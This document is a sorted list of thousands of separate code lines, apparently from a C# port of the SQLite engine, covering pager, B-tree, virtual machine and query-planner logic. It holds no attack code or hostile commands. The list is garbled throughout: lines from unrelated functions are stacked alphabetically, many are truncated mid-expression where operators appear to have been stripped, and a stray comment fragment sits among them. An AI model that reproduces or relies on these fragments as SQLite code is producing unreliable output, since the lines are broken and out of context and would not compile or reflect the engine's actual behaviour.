        if ( aRegIdx == null ) goto update_cleanup
        if ( aRegIdx[iCur] == 0 ) continue
        if ( aRegIdx[i] == 0 ) continue
        if ( a[i 
        if ( addrNext != 0 )
        if ( addrSortIndex >= 0 
        if ( aff1 >= SQLITE_AFF_NUMERIC 
        if ( aiValues == null )
        if ( attr == FileAttributes.Directory )
        if ( b == zRight.Length ) return UpperToLower[zLeft[a]]
        if ( bA[i] != B[i] ) return ( bA[i] < B[i] ) 
        if ( bA[i] != bB[i] ) return ( bA[i] < bB[i] ) 
        if ( bCloseTrans != 0 )
        if ( bPurgeable != 0 )
        if ( bRev != 0 )
        if ( bRev == ( ( pIdx.aSortOrder[nEq] == SQLITE_SO_ASC ) 
        if ( c != '%' )
        if ( c == '
        if ( c == '.' )
        if ( c == 'l' )
        if ( c == 0 )
        if ( c > 0xff ) c = 0
        if ( chngRowid )
        if ( ci.iOverflow != this.iOverflow 
        if ( ci.nHeader != this.nHeader 
        if ( ci.nKey != this.nKey 
        if ( ci.pCell[ci.iCell] != this.pCell[iCell] ) return false
        if ( cnt != 0 
        if ( cnt == 0 
        if ( cnt == 0 )
        if ( cookie != db.aDb[iDb].pSchema.schema_cookie )
        if ( cost < pCost.rCost )
        if ( cp.pDflt != null ) cp.pDflt = pDflt.Copy()
        if ( d1 >= nKey1 
        if ( data == null )
        if ( db.aDb[iDb].pBt != null )
        if ( db.aDb[i].pBt != null )
        if ( db.activeVdbeCnt != 0 )
        if ( db.activeVdbeCnt == 0 )
        if ( db.init.busy != 0 )
        if ( db.init.iDb == 1 )
        if ( db.mutex == null )
        if ( db.nStatement !=0 
        if ( db.xProfile != null 
        if ( db.xProgress != null )
        if ( delay <= 0 ) return 0
        if ( dequote != 0 
        if ( doHardCopy /
        if ( doTruncate != 0 
        if ( eStatementOp != 0 )
        if ( elem.nKey == nKey 
        if ( enc != SQLITE_UTF8 )
        if ( enc == 0 )
        if ( enc == SQLITE_UTF8 )
        if ( enc == p.iPrefEnc )
        if ( file_format >= 4 
        if ( fire_this )
        if ( flag_leftjustify )
        if ( growOpArray( p ) != 0 )
        if ( h >= BITVEC_NINT ) h = 0
        if ( hasMoved != 0 )
        if ( i < 1 
        if ( i < pIdx.nColumn )
        if ( i < pList.nExpr - 1 )
        if ( i == pTab.iPKey )
        if ( i == z.Length ) z.Append( '
        if ( i > mxSqlLen )
        if ( i > nEqCol )
        if ( i > pParse.nVar )
        if ( i >= pParse.nVarExpr )
        if ( i >= wsdAutoext.nExt )
        if ( iChunkOffset == 0 )
        if ( iCol < 0 )
        if ( iCol > 0 )
        if ( iColumn < 0 
        if ( iDb < 0 )
        if ( iDb < 0 ) goto exit_create_index
        if ( iDb == 0 
        if ( iDb == 0 )
        if ( iDb > 0 ) return
        if ( iDb >= 0 )
        if ( iDest == PENDING_BYTE_PAGE( p.pDest.pBt ) ) continue
        if ( iDestroyed == 0 
        if ( iLargest == 0 )
        if ( iLength[i] == n 
        if ( iPageSize < 512 
        if ( iReg >= 0 
        if ( idx == pTab.iPKey )
        if ( ifExists == 0 )
        if ( inMultIsEst != 0 
        if ( isAgg 
        if ( isAgg )
        if ( isBtreeCursor != 0 )
        if ( isComplete )
        if ( isErrorReset 
        if ( isExplain != 0 
        if ( isMainJrnl != 0 
        if ( isOpen( pPager.fd ) 
        if ( isOpen( pPager.jfd ) 
        if ( isOpen( pPager.jfd ) )
        if ( isSpecialError )
        if ( isView != 0 
        if ( isVirtual != 0 )
        if ( j < 0 ) return SQLITE_AFF_INTEGER
        if ( j < i )
        if ( j >= ArraySize( aKeyword ) )
        if ( j >= pTab.nCol )
        if ( key )
        if ( keyColumn < 0 )
        if ( keyColumn >= 0 )
        if ( lastTokenParsed != TK_SEMI )
        if ( length > 0 )
        if ( locktype == SHARED_LOCK 
        if ( mem0.nScratchFree == 0 )
        if ( n != P4_KEYINFO 
        if ( n < (u64)zBuf.Capacity )
        if ( n < 0 ) n = 0
        if ( n > 0 
        if ( n > 30 ) n = 30
        if ( n >= BMS )
        if ( nByte == 0 )
        if ( nByte > iLimit )
        if ( nBytes > mxLen )
        if ( nChar > 0 )
        if ( nEq < pProbe.nColumn )
        if ( nField != 0 )
        if ( nJRec == 0
        if ( nNew == 0 
        if ( nOld == nNew )
        if ( nRec == 0 
        if ( nRec == 0xffffffff )
        if ( nReserve < 0 ) nReserve = pPager.nReserve
        if ( nSubSrc > 1 )
        if ( nUsed 
        if ( needSync
        if ( negFlag ) i = -i
        if ( newLimit > aHardLimit[limitId] )
        if ( noErr != 0 )
        if ( noErr == 0 )
        if ( null == p )
        if ( null == p.pSrc 
        if ( null == pColl )
        if ( null == pDone )
        if ( null == pIdx )
        if ( null == pPage.pData )
        if ( null == pPg )
        if ( null == pVal ) goto no_mem
        if ( null == v
        if ( null == zRight )
        if ( okToChngToIN != 0 )
        if ( old_col_mask == 0 )
        if ( onError != OE_Replace 
        if ( onError == OE_Ignore )
        if ( onError == OE_None )
        if ( onError == OE_None ) continue
        if ( onError == OE_Replace 
        if ( onError == OE_Replace )
        if ( op != OP_Noop )
        if ( op != TK_CAST 
        if ( op != TK_INTEGER 
        if ( op == SAVEPOINT_ROLLBACK 
        if ( opcode == OP_Function 
        if ( opcode == OP_Halt )
        if ( openAll 
        if ( openedTransaction!=0 )
        if ( overrideError != OE_Default )
        if ( p != null 
        if ( p != null )
        if ( p != null ) break
        if ( p.aMem != null )
        if ( p.aVar != null )
        if ( p.changeCntOn)
        if ( p.explain == 1 )
        if ( p.iReg != 0 
        if ( p.iReg != 0 )
        if ( p.iReg == 0 )
        if ( p.iReg == iReg )
        if ( p.iReg > 0 
        if ( p.isSorted 
        if ( p.lru < minLru )
        if ( p.magic == VDBE_MAGIC_RUN 
        if ( p.nArg == nArg 
        if ( p.nHeight > pnHeight )
        if ( p.nOrig >= pgno 
        if ( p.nRef == 0 )
        if ( p.nSet < ( BITVEC_NINT - 1 ) )
        if ( p.op == op 
        if ( p.overflow != 0 )
        if ( p.pCache.bPurgeable )
        if ( p.pDestDb != null 
        if ( p.pEntry == null )
        if ( p.pHaving != null 
        if ( p.pLeft != null 
        if ( p.pNext == pVfs )
        if ( p.pOffset != null )
        if ( p.pOrderBy != null )
        if ( p.pResultSet[i_pMem] == null ) p.pResultSet[i_pMem] = new Mem()
        if ( p.pRightmost == null )
        if ( p.pSelect == null )
        if ( p.pgno == 1 )
        if ( p.rc != SQLITE_OK 
        if ( p.readOnly == false ) db.writeVdbeCnt
        if ( p.trace != null )
        if ( p.trace == null 
        if ( p.u.aHash[h] == i ) return SQLITE_OK
        if ( p.u.apSub[bin] == null )
        if ( p.v < iRowid )
        if ( p.validTZ != 0 )
        if ( p.zBLOB == null 
        if ( p1 < 0 )
        if ( p2 < 0 )
        if ( p2 < 0 ) p2 = 0
        if ( pA.pgno < pB.pgno )
        if ( pA.v < pB.v )
        if ( pA.x.pList.nExpr != pB.x.pList.nExpr ) return false
        if ( pAccum.tooBig != 0 )
        if ( pBt != null 
        if ( pBt != null )
        if ( pBt == null ) continue
        if ( pBtree != null )
        if ( pC != null )
        if ( pCache.bPurgeable )
        if ( pCell != null )
        if ( pCol != null )
        if ( pCol.affinity == 0 ) pCol.affinity = SQLITE_AFF_NONE
        if ( pColl != null )
        if ( pColl == null )
        if ( pColl2.xCmp != null )
        if ( pDb.pBt != null )
        if ( pDb.pBt == null )
        if ( pDb.pBt == null ) continue
        if ( pDb.pSchema != null )
        if ( pDest.aCol[i].affinity != pSrc.aCol[i].affinity )
        if ( pDest.aCol[i].notNull != 0 
        if ( pDestIdx.onError != OE_None )
        if ( pDup == null ) return
        if ( pE.op == TK_ALL ) break
        if ( pE.op == TK_DOT 
        if ( pEList.a[iCol].iAlias == 0 )
        if ( pEList.a[i].zName != null 
        if ( pEList.a[i].zName != null )
        if ( pEnd != null )
        if ( pEntry.chain == elem )
        if ( pExpr != null )
        if ( pExpr.iColumn != iColumn 
        if ( pExpr.iColumn < 0 )
        if ( pExpr.op != TK_COLUMN 
        if ( pExpr.op != TK_ID )
        if ( pF.iDistinct >= 0 )
        if ( pFrom.pTab != null )
        if ( pFrom.zName == null )
        if ( pFunc.iDistinct >= 0 )
        if ( pGroupBy != null 
        if ( pGroupBy != null )
        if ( pH.first != null ) { pH.first.prev = pNew
        if ( pHaving != null )
        if ( pHead.prev != null ) { pHead.prev.next = pNew
        if ( pIdx != null )
        if ( pIdx.tnum == iFrom )
        if ( pIdx_zColAff == null )
        if ( pIndex == null )
        if ( pIndex.pTable.pIndex == pIndex )
        if ( pIndexedBy.n == 1 
        if ( pInfo == null )
        if ( pItem.iAlias != 0 )
        if ( pItem.iCol != 0 )
        if ( pItem.zDatabase == null )
        if ( pKeyDup != null )
        if ( pKeyInfo != null )
        if ( pKeyInfo == null )
        if ( pKeyMerge != null )
        if ( pLeft != null )
        if ( pLeft.op == TK_COLUMN )
        if ( pLevel.iLeftJoin != 0 
        if ( pLevel.iLeftJoin != 0 )
        if ( pLevel.op != OP_Noop )
        if ( pLevel.u._in.aInLoop != null )//(pIn )
        if ( pLevel.u._in.aInLoop == null ) pLevel.u._in.aInLoop = new InLoop[pLevel.u._in.nIn]
        if ( pLevel.u._in.nIn == 0 )
        if ( pList != null )
        if ( pList == null )
        if ( pList == null ) goto exit_create_index
        if ( pList == null ) return null
        if ( pList.nExpr > 1 ) iCol = -1
        if ( pList.pgno <= pPager.dbSize 
        if ( pListItem.pExpr != null 
        if ( pMaskSet.ix[i] == iCursor )
        if ( pMem._StrAccum == null ) pMem._StrAccum = new StrAccum()
        if ( pMem.z == null 
        if ( pMem.z == null ) return 0
        if ( pName2.n > 0 )
        if ( pNew != null )
        if ( pNew == null )
        if ( pOld != null )
        if ( pOp.opcode == OP_OpenRead 
        if ( pOrderBy != null )
        if ( pOrderBy == null )
        if ( pOrderBy.a[i].done == 0 )
        if ( pPage.pCache.szPage != pCache.szPage )
        if ( pPage.pLruNext != null )
        if ( pPage.pLruPrev != null )
        if ( pPager.aSavepoint[ii].iHdrOffset == 0 )
        if ( pPager.dbSize != pPager.dbFileSize )
        if ( pPager.dbSize < pPager.dbOrigSize
        if ( pPager.errCode != 0 )
        if ( pPager.journalMode != PAGER_JOURNALMODE_MEMORY )
        if ( pPager.journalMode == PAGER_JOURNALMODE_MEMORY 
        if ( pPager.journalMode == PAGER_JOURNALMODE_MEMORY )
        if ( pPager.journalOff == JOURNAL_HDR_SZ( pPager ) )
        if ( pPager.noReadlock != 0 )
        if ( pPager.pBackup != null 
        if ( pPager.pBackup != null )
        if ( pPager.state != PAGER_UNLOCK )
        if ( pPager.state == PAGER_RESERVED )
        if ( pPager.state >= PAGER_EXCLUSIVE )
        if ( pParse == null )
        if ( pParse.cookieGoto > 0 )
        if ( pParse.explain == 2 )
        if ( pParse.nMem < 3 )
        if ( pParse.nTempReg < ArraySize( pParse.aTempReg ) )
        if ( pPg != null )
        if ( pPg.pgno > nPageCount )
        if ( pProbe.onError != OE_None 
        if ( pRangeEnd != null )
        if ( pRangeStart != null )
        if ( pRight != null 
        if ( pRight != null )
        if ( pRight.pOn != null 
        if ( pRight.pOn != null )
        if ( pRight.pUsing != null )
        if ( pRowSet.pEntry != null )
        if ( pSelTab != null )
        if ( pSelect != null )
        if ( pSelect.iOffset != 0 )
        if ( pSrc != null )
        if ( pSrc.aSortOrder[i] != pDest.aSortOrder[i] )
        if ( pSrc.aiColumn[i] != pDest.aiColumn[i] )
        if ( pSrcIdx == null )
        if ( pSrcList != null )
        if ( pStart != null )
        if ( pStmt == null )
        if ( pSub == null 
        if ( pSub.pLimit != null )
        if ( pSub.pOrderBy != null )
        if ( pSub.pWhere != null )
        if ( pTab != null )
        if ( pTab == null ) goto exit_create_index
        if ( pTab == null /
        if ( pTab.pSelect != null )
        if ( pTab.tnum == iFrom )
        if ( pTabToDel.nRef == 1 )
        if ( pTable != null )
        if ( pTblName != null )
        if ( pTerm != null )
        if ( pTerm.eOperator == WO_OR
        if ( pTerm.iParent >= 0 )
        if ( pTerm.leftCursor == iCur
        if ( pToCol != null 
        if ( pToken != null )
        if ( pTrig != null )
        if ( pTrigger != null 
        if ( pTrigger != null )
        if ( pTrigger != null ) break
        if ( pTrigger.pSchema == pTrigger.pTabSchema )
        if ( pVal == null )
        if ( pVal == null ) goto no_mem
        if ( pValue != null )
        if ( pVdbeFunc == null )
        if ( pVm != null 
        if ( pWInfo == null ) goto delete_from_cleanup
        if ( pWInfo == null ) goto select_end
        if ( pcache1.pLruHead != null )
        if ( pcache1.pLruHead == pPage )
        if ( pcache1.pLruTail == pPage )
        if ( pgno <= p.nOrig )
        if ( pgno <= pPager.dbOrigSize )
        if ( pgno == 0 
        if ( pgno == 1 )
        if ( pgno > pPager.dbFileSize )
        if ( prNotFound != -1 )  // Klude to show prNotFound not available
        if ( precision > etBUFSIZE - 40 
        if ( r >= iFrom 
        if ( r >= iStart 
        if ( r1 != regBase 
        if ( rc != 0 
        if ( rc != 0 )
        if ( rc != 0 ) break
        if ( rc != 0 ) return rc
        if ( rc != SQLITE_OK )
        if ( rc != SQLITE_OK ) goto commit_phase_one_exit
        if ( rc != SQLITE_OK ) goto end_of_vacuum
        if ( rc == SQLITE_DONE
        if ( rc == SQLITE_IOERR_NOMEM )
        if ( rc == SQLITE_IOERR_SHORT_READ )
        if ( rc == SQLITE_NOMEM 
        if ( rc == SQLITE_NOMEM )
        if ( rc == SQLITE_OK 
        if ( rc == SQLITE_OK )
        if ( rc == SQLITE_OK ) rc = initData.rc
        if ( rc == SQLITE_SCHEMA 
        if ( regRec > pParse.nMem )
        if ( res != 0 )
        if ( score > bestScore )
        if ( seenReplace )
        if ( serial_type == 7 )
        if ( size < 0 ) size = -size
        if ( size == 0 ) { size = SQLITE_DEFAULT_CACHE_SIZE
        if ( sqlite3BtreeIsInTrans( pBt ) )
        if ( sqlite3ExprIsConstantOrFunction( pSpan.pExpr ) == 0 )
        if ( sqlite3GlobalConfig.pInitMutex == null )
        if ( sqlite3IsMemJournal( pPager.jfd ) )
        if ( sqlite3IsNaN( value ) )
        if ( sqlite3ReadSchema( pParse ) != 0 ) goto pragma_out
        if ( sqlite3_diskfull_pending.iValue == 1 )
        if ( sqlite3_interrupt_count > 0 )
        if ( sqlite3_value_type( argv[i] ) == SQLITE_NULL ) return
        if ( subjRequiresPage( pPg ) )
        if ( subqueryIsAgg )
        if ( testOp != OP_Noop )
        if ( this == null )
        if ( true ) //n
        if ( type == SQLITE_INTEGER )
        if ( u <= 127 ) return 1
        if ( u <= 2147483647 ) return 4
        if ( u <= 32767 ) return 2
        if ( u <= 8388607 ) return 3
        if ( u <= MAX_6BYTE ) return 5
        if ( useSeekResult )
        if ( useTempTable )
        if ( v != null )
        if ( v == null ) goto exit_create_index
        if ( v == null ) goto triggerfinish_cleanup
        if ( width > etBUFSIZE - 10 )
        if ( wsFlags != 0 
        if ( x >= iFrom 
        if ( xInit != null 
        if ( z != pMem.z )
        if ( z == null ) return
        if ( z == null ) z = pTabItem.pTab.zName
        if ( zBLOB == null ) return
        if ( zBLOB == null ) zBLOB = null
        if ( zBLOB.Length == 0 
        if ( zCharSet != null )
        if ( zColAff == null )
        if ( zColl == null 
        if ( zColl == null ) return
        if ( zConverted.Length != 0 )
        if ( zData != null )
        if ( zDatabase != null 
        if ( zDb != null 
        if ( zDb != null )
        if ( zDb == null 
        if ( zDbase != null )
        if ( zEsc == null ) return
        if ( zExternal == null ) return
        if ( zFormat != null )
        if ( zFull.Length > pVfs.mxPathname ) zFull.Length = pVfs.mxPathname
        if ( zIndex 
        if ( zIndex < z.Length 
        if ( zIndex == z.Length 
        if ( zName == null )
        if ( zName == null ) goto exit_create_index
        if ( zPathname == null )
        if ( zSqlCopy != null )
        if ( zVfs == null 
        if ( zVfs == pVfs.zName ) break
        if ( z[i] == quote )
        if ( z[zDx] == '-' )
        if ( z[zDx] == '.' )
        if ( z[zDx] == 'e' 
        if (((pageSize - 1) 
        if ((i--) == 0) break
        if ((nSize 
        if ((pCur.pKeyInfo == null) != (pCur.apPage[0].intKey != 0))
        if ((rc == SQLITE_DONE 
        if ((sz > info.nLocal)
        if (0 == pPage.intKey) sz 
        if (0 == pPage.leaf)
        if (CURSOR_INVALID == pCur.eState)
        if (NEVER( rc != SQLITE_OK ))
        if (NEVER(nKey > 0x7fffffff 
        if (a 
        if (aRoot[i] == 0) continue
        if (biasRight != 0)
        if (cbrk < iCellFirst)
        if (chldPg == 0)
        if (cnt != data[hdr 
        if (eType == PTRMAP_FREEPAGE)
        if (eType == PTRMAP_ROOTPAGE)
        if (exact != 0 
        if (i 
        if (i < nOld - 1 
        if (i < nOld)
        if (i == nCell)
        if (iChild != 0)
        if (iGuess <= pagerPagecount(pBt))
        if (iIdx == pPage.nCell)
        if (iLookAhead > 0)
        if (iPage < 1)
        if (iPage == 0)
        if (iParentIdx == 0)
        if (idx == BTREE_INCR_VACUUM)
        if (isFreeList != 0)
        if (j < nCell)
        if (k <= iCell)
        if (minI > i)
        if (n > spaceLeft) n = spaceLeft
        if (nFin > nOrig)
        if (nFree > usableSize)
        if (nFreeList == 0)
        if (nLeaf < (u32)pBt.usableSize / 4 - 8)
        if (nLeaf > (u32)pBt.usableSize / 4 - 2)
        if (nOrig > PENDING_BYTE_PAGE(pBt) 
        if (nOvfl != 0)
        if (nSize > pPage.maxLocal)
        if (nSrc == 0)
        if (nSrc > 0)
        if (nextOvfl != 0)
        if (null == pBt.pHasContent)
        if (ovflPgno < 2 
        if (p != pColl) // Had to lookup appropriate sequence
        if (p != pExcept 
        if (p.inTrans != TRANS_NONE)
        if (p.inTrans == TRANS_NONE)
        if (p.inTrans > pBt.inTransaction)
        if (p.pgnoRoot == pCur.pgnoRoot) p.cachedRowid = iRowid
        if (pBt != null 
        if (pBt.autoVacuum 
        if (pBt.autoVacuum)
        if (pBt.pageSize < 512 
        if (pBt.xFreeSchema != null 
        if (pColl != null ) break
        if (pCur.atLast != 0 
        if (pCur.eState == CURSOR_FAULT)
        if (pCur.eState == CURSOR_INVALID)
        if (pCur.info.nKey == intKey)
        if (pCur.pNext != null)
        if (pCur.pPrev != null)
        if (pCur.wrFlag != 0 
        if (pIdxKey == null) return SQLITE_NOMEM
        if (pMem.z != null) n = Encoding.UTF8.GetByteCount(pMem.n < pMem.z.Length 
        if (pOvfl != null)
        if (pPage.hasData != 0)
        if (pPage.intKey != 0 
        if (pPage.intKey != 0)
        if (pPage.leaf != 0 
        if (pPage.leaf != 0)
        if (pPage.nCell > MX_CELL(pBt))
        if (pPage.pBt.autoVacuum)
        if (pPgno == PENDING_BYTE_PAGE(pBt))
        if (pRoot.pgno != 1)
        if (pTemp != null)
        if (pTmp.pBtree == p)
        if (page1[18] > 1)
        if (page1[19] > 1)
        if (pageSize != pBt.pageSize)
        if (pbegin 
        if (pbegin < addr 
        if (pgnoMove != pgnoRoot)
        if (rc != 0)
        if (rc != 0) goto balance_cleanup
        if (rc != 0) goto btree_open_out
        if (rc != 0) goto cleardatabasepage_out
        if (rc != 0) goto end_insert
        if (rc != 0) goto freepage_out
        if (rc != 0) goto moveto_finish
        if (rc != 0) return rc
        if (rc != 0) { pRC = rc
        if (rc != SQLITE_OK)
        if (rc == SQLITE_OK 
        if (rc == SQLITE_OK)
        if (rc2 != SQLITE_OK)
        if (sCheck.anRef[i] != 0 
        if (sCheck.anRef[i] == 0 
        if (spaceLeft == 0)
        if (sqlite3Get4byte(pPage.aData) != iFrom)
        if (sqlite3PagerPageRefcount((ppPage).pDbPage) > 1)
        if (sqlite3PagerPageRefcount(pData) > 1)
        if (subtotal > usableSpace)
        if (surplus <= maxLocal)
        if (usableSize < 480)
        if (yyact < YYNSTATE)
        if( !zType ) continue
        if( i<nType ){
        if( x ) x(p)
        infop = fmtinfo[0]
        ins = cellOffset 
        int (
        int _base
        int _pCell = iCell
        int a = (int)amt
        int addr
        int addrEnd
        int addrNext = 0
        int allOk = sqlite3VdbeMakeLabel( v )
        int bCloseTrans = 0
        int bestJ = 0
        int c
        int cmp
        int cnt = 0
        int cnt = 3
        int currentSize = 0
        int d
        int eStatementOp = 0
        int eType
        int enc = ENC( sqlite3VdbeDb( v ) )
        int endEq
        int fileFormat
        int firstTerm = pAccum.useMalloc == 0 
        int flags = pParse.db.flags
        int fout = 0
        int groupBySort
        int hasMoved = 0
        int i
        int i = 0
        int i = pExpr.u.iValue
        int iAMem
        int iAbortFlag
        int iBMem
        int iCellFirst
        int iCellLast
        int iChunkOffset = (int)( p.endpoint.iOffset % JOURNAL_CHUNKSIZE )
        int iCol = p.nCol - 1
        int iCol = pExpr.iColumn
        int iColumn
        int iColumn = -1
        int iCursor = -1
        int iData
        int iDb
        int iDb = db.nDb - 1
        int iDummy = -1
        int iDummy = 0
        int iFromHdr = pFrom.hdrOffset
        int iGoto
        int iIdx
        int iIdxCur
        int iLargest = 0
        int iLimit
        int iMem
        int iMem = 
        int iOff = 0
        int iPage = pCur.iPage
        int iRec
        int iRowSet = 
        int iRowid = 
        int iSavepoint = p.iStatement - 1
        int iSize = p.pData.Length
        int iSortOrder
        int iSpace = JOURNAL_CHUNKSIZE - iChunkOffset
        int iTab
        int iToHdr = ((pTo.pgno == 1) 
        int iUseFlag
        int idx = pCur.aiIdx[pCur.iPage]
        int idx = pIdx.aiColumn[j]
        int ii
        int inMultIsEst = 0
        int isHotJournal = 0
        int isMinQuery = 0
        int isUnsync = 0
        int iz = 0
        int j
        int j = ( i < 2 ) 
        int j = 0
        int j = pExpr.iColumn
        int j1
        int j2 = sqlite3VdbeCurrentAddr( v ) 
        int k
        int k = pIdx.aiColumn[j]
        int len
        int limit
        int locked = 0
        int maxLocal
        int mem = 
        int memEndValue = 0
        int memId = p.regCtr
        int minI = i
        int minLocal
        int minLocal = pPage.minLocal
        int minV = (int)apNew[i].pgno
        int mrc
        int mxLen = db.aLimit[SQLITE_LIMIT_SQL_LENGTH]
        int n
        int n = 0
        int n = p.n
        int n = p.nLabelAlloc 
        int n = pExpr.iColumn
        int n = pList.nAlloc 
        int n = sqlite3GlobalConfig.nPage
        int n = sqlite3Strlen30( zName )
        int nAlloc = pSrc.nSrc 
        int nArg
        int nArg = 0
        int nAux = ( pVdbeFunc != null 
        int nByte
        int nCell
        int nCol
        int nConstraint
        int nEntry
        int nEq = (int)pLevel.plan.nEq
        int nExpr = p.pEList.nExpr
        int nExtraReg = 0
        int nGot
        int nIdx
        int nMalloc = iArg
        int nNew
        int nPage = (int)pagerPagecount(pBt)
        int nPage = 100
        int nPageCount = 0
        int nSize
        int nSrcPage = -1
        int nSubSrc
        int nType
        int nUsed = sqlite3StatusValue( SQLITE_STATUS_MEMORY_USED )
        int nVal
        int newSize
        int notUsed = 0
        int okToChngToIN = 0
        int once = 0
        int op
        int op = IsVirtual( pTab ) 
        int opcode = pOp.opcode
        int openedTransaction = 0
        int orconf = ( ( pParse.trigStack != null ) 
        int overhead
        int pAddr
        int pEnd
        int pOut = 4
        int pRegKey = regIdxKey
        int pStop
        int pageSize
        int pageSize = pPageSize
        int r
        int r = p.iReg
        int r1
        int r1 = 
        int r1 = sqlite3GetTempReg( pParse )
        int r2
        int r2 = sqlite3GetTempReg( pParse )
        int rMayHaveNull = 0
        int rc
        int rc = 0
        int rc = getTempname( MAX_PATH 
        int rc = sqlite3PagerWrite(pDbPage)
        int rc = sqlite3PagerWrite(pPage.pDbPage)
        int rc2
        int realnum = 0
        int reg
        int regAgg
        int regBase
        int regCol
        int regCols
        int regF2
        int regFields
        int regIdx
        int regR
        int regRec
        int regRow
        int regRowid
        int regRowid = regIdxKey 
        int regTemp
        int regTrigRowid
        int res = 0
        int retries = 3
        int s = (int)( x.s 
        int start
        int startEq
        int start_constraints
        int surplus
        int sz = ROUNDDOWN8( sqlite3GlobalConfig.szPage )
        int sz = nByte
        int szLeft = szNew[i - 1]
        int szRight = szNew[i]
        int termSortOrder
        int testOp = OP_Noop
        int top
        int usableSize
        int x = p.iReg
        int[] aEndOp = new int[]  {
        int[] aStartOp = new int[]  {
        int[] lenOne = new int[] { 1 }
        int[] szCell = new int[1]
        invalidateAllOverflowCache(pBt)
        invalidateOverflowCache(pCur)
        isAggSub = ( pSub.selFlags 
        isDistinct = false
        isOuter = ( pRight.jointype 
        isSpecialError = mrc == SQLITE_NOMEM 
        isThreadsafe = 0
        isThreadsafe = 1
        isThreadsafe = sqlite3GlobalConfig.bFullMutex 
        izOut 
        izWrite 
        j
        j = cntNew[i]
        j = pPage.nOverflow
        jointype = JT_INNER
        journalFileSize = ROUND8( sqlite3JournalSize( pVfs ) )
        journalFileSize = ROUND8( sqlite3MemJournalSize() )
        k 
        k = 1
        k = 2
        k = pIdx.aiColumn[nEq]
        k = pOvfl.idx
        k = sqlite3Strlen30( zStmt )
        keyColumn = pTab.iPKey
        lastErrno = 0
        len = 0
        len = i = sqlite3VdbeSerialTypeLen( serial_type )
        len = sqlite3Strlen30( zType )
        len = sqlite3_value_bytes( argv[0] )
        len = z.Length
        limit = pOld.nCell 
        local_ioerr()
        locktype = 0
        logN 
        lwr = 0
        mask 
        mask = (u32)( 1 << iDb )
        match = 1
        max = sqlite3_context_db_handle( context ) != null 
        maxLocal = pPage.maxLocal
        mem0 = new Mem0Global()
        mem0.aPageFree = new int[sqlite3GlobalConfig.szPage 
        mem0.mutex = sqlite3MutexAlloc( SQLITE_MUTEX_STATIC_MEM )
        mem0.nPageFree = sqlite3GlobalConfig.nPage
        memCnt = 
        memId = p.regCtr
        memId = pInfo.regCtr
        minLocal = pPage.minLocal
        moreToDo = 0
        move the row2 cursor to a null row
        moveToRoot(pCur)
        mrc = p.rc 
        n 
        n = 1
        n = nPayload
        n = pMem.zBLOB != null 
        n = pParse.nTab
        n = sqlite3Strlen30( z )
        n = sqlite3_value_int( argv[1] )
        nAlias = 0
        nAlias = SaveBuf[nested].nAlias
        nAliasAlloc = 0
        nAliasAlloc = SaveBuf[nested].nAliasAlloc
        nByte 
        nByte = pCache.szPage 
        nCell = pPage.nCell
        nChar = 1
        nCol = 1
        nCol = p.pEList.nExpr
        nCol = pFromCol.nExpr
        nCol = pIdx.nColumn
        nCol = sqlite3_column_count( pStmt )
        nColumn = pList != null 
        nColumn = pSelect.pEList.nExpr
        nCompound
        nConstraint = nEq
        nData = 0
        nData = nZero = 0
        nEntry = pBt.usableSize / 5
        nEq = i
        nErr
        nField = _p4.pKeyInfo.nField
        nFin = nOrig - nFree - nPtrmap
        nFree = (u16)(data[hdr 
        nFull = sqlite3MallocSize( p )
        nHash = 0
        nHeader 
        nHeader = JOURNAL_HDR_SZ( pPager )
        nHeight = 0
        nHeight = SaveBuf[nested].nHeight
        nHeight = cf.nHeight
        nHidden = 0
        nKey = (u32)pCur.info.nKey
        nKey = 0
        nKey--
        nLocal = pCur.info.nLocal
        nLocal = pCur.info.nLocal - nKey
        nMaxCells 
        nName = sqlite3Strlen30( zName )
        nNew = 256
        nNew = iSavepoint 
        nNew = sqlite3GlobalConfig.m.xRoundup( nBytes )
        nOld = 3
        nOld = i 
        nOrig = pagerPagecount(pBt)
        nPage = (int)pPager.dbSize
        nPage = 0
        nPage = sqlite3GlobalConfig.pcache.xPagecount( pCache.pCache )
        nPathname = pVfs.mxPathname 
        nPathname = sqlite3Strlen30( zPathname )
        nPayload 
        nPayload -= n
        nPtrmap = (Pgno)(( nFree - nOrig 
        nRead -= iSpace
        nRecyclable
        nRecyclable = 0
        nRef = 0
        nReserve = pBt.pageSize - pBt.usableSize
        nResultCol = nColumn
        nResultCol = pEList.nExpr
        nRow = cost
        nRow = pProbe.aiRowEst[i] 
        nSize 
        nSize = (int)nPayload 
        nSize = (u32)(minLocal 
        nSize = 4
        nSize = EXPR_FULLSIZE
        nSrc -= n
        nSrc = (int)nKey
        nSrc = nData
        nSubSrc = pSubSrc.nSrc
        nType = sqlite3Strlen30(zType)
        nVal = sqlite3Strlen30( zVal ) - 1
        nVal = sqlite3_value_bytes( argv[0] )
        nVar = 0
        nVarExpr = 0
        nVarExpr = SaveBuf[nested].nVarExpr
        nVarExprAlloc = 0
        nVarExprAlloc = SaveBuf[nested].nVarExprAlloc
        nWrite -= iSpace
        needQuote = ( j < zIdent.Length 
        needSyncPgno = pPg.pgno
        neg = 1
        neg = false
        neg = true
        newIdx = pParse.nTab
        newLocktype = PENDING_LOCK
        newSize = ( pnAlloc ) 
        newSize = (int)( pPager.pageSize 
        next_elem = elem.next
        not contain ORDER BY.  (Ticket 
        notReady 
        null == pOffset 
        nullId.n = sqlite3Strlen30( nullId.z )
        nullId.z = pTab.aCol[pTab.nCol - 1].zName
        nxDiv = 0
        object old_data = elem.data
        offset -= pCur.info.nLocal
        offset = (int)( ( ( c - 1 ) / pPager.sectorSize 
        offset = 0
        oldIdx = pParse.nTab
        onError = OE_Abort
        onError = overrideError != OE_Default 
        onError = pIdx.onError
        onError = pTab.aCol[i].notNull
        onError = pTab.keyConf
        op = TK_NULL
        op = aEndOp[( ( pRangeEnd != null 
        op = aStartOp[( start_constraints << 2 ) 
        op = cf.op
        op = p.op
        op = pExpr.op
        opProperty = opcodeProperty[pOp.opcode]
        openedTransaction = 1
        orconf = ( orconfin == OE_Default ) 
        outOffset = (int)( pCur.info.iCell 
        overhead = ( 4 
        ovflPgno = iNext
        ovlp.EventHandle = IntPtr.Zero
        ovlp.OffsetHigh = 0
        ovlp.OffsetLow = (int)offset
        p = aPragma[i]
        p = a[i].pExpr
        p = apAll[i]
        p = new PgHdr()
        p = new PgHdr1()
        p = new Schema()
        p = new sqlite3_backup()
        p = null
        p = p.pLeft
        p = p.pNext
        p = p.pPrior
        p = p.pRight
        p = p.u.apSub[bin]
        p = pEList.a[i].pExpr
        p = pIn
        p = pList
        p = pParse.aColCache[i]
